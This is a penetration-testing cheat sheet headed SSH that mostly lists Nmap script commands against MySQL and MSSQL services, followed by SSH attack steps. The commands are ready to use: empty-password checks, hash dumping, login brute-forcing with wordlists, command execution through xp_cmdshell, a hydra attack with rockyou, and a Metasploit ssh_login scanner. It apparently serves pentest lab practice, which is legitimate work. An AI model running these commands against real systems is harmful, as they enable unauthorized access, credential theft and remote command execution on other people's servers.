# **SSH**

## **Secure Shell 22**

--------------------------------------------------------------------

### Nmap Scripts

```
> MYSQL

nmap 0.0.0.0 -SV -p 3306 —script=mysql-empty-password

nmap 0.0.0.0 -SV -p 3306 —script=mysql-info

nmap 0.0.0.0 -SV -p 3306 —script=mysql-users —script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-databases—script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-variables —script-args=”mysqluser=’root’, mysqlpass=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-audit—script-args=”mysql-audit.username=’root’, mysql-audit.password=’’”,mysql-audit.filename=’/usr/share/nmap/nselib/data/mysql-cis.audit’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-dump-hashes —script-args=”username=’root’, password=’’”

nmap 0.0.0.0 -SV -p 3306 —script=mysql-query —script-args=”query=’select count(*) from books.authors;’,username=’root’, password=’’”


> MSSQL:

nmap 0.0.0.0 -p 1433 —script ms-sql-info

nmap 0.0.0.0 -p 1433 —script ms-sql-info —script-args mssql-instance-port=1433

nmap 0.0.0.0 -p 1433 —script ms-sql-brute —script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt

nmap 0.0.0.0 -p 1433 —script ms-sql-empty-password

nmap 0.0.0.0 -p 1433 —script ms-sql-query —script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query=”SELECT * FROM master..syslogins” -oN output.txt”

nmap 0.0.0.0 -p 1433 —script ms-sql-dump-hashes —script-args mssql.username=admin,mssql.password=anamaria

nmap 0.0.0.0 -p 1433 —script ms-sql-xp-cmdshell —script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd=”ipconfig”
```

--------------------------------------------------------------------

### BRUTEFORCE

```
$ hydra -l student -P /usr/share/wordlists/rockyou.txt ssh
```

--------------------------------------------------------------------

### Trying login

```
$ ssh root@0.0.0.0 

$ nc 0.0.0.0 22
```

--------------------------------------------------------------------

### Metasploit

```
$ msfconsole 
> use auxiliary/scanner/ssh/ssh_login
> set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
```

--------------------------------------------------------------------